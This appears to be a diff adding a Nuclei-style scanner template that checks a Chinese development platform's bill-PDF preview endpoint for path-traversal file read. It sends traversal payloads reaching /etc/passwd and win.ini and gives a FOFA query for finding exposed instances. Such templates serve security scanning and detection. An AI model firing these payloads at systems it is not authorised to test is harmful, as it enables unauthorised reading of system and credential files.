@@ -1,0 +1,25 @@
+id: znk-preview-fileread
+
+info:
+  name: 真内控国产化开发平台 preview - fileread
+  author: god
+  severity: high
+  metadata:
+    verified:
+    fofa-query: body="js/npm.echarts.js"
+  tags: znk,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/print/billPdf/preview?urlPath=../../../../../../../../../../../../../../c:/windows/win.ini"
+    
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
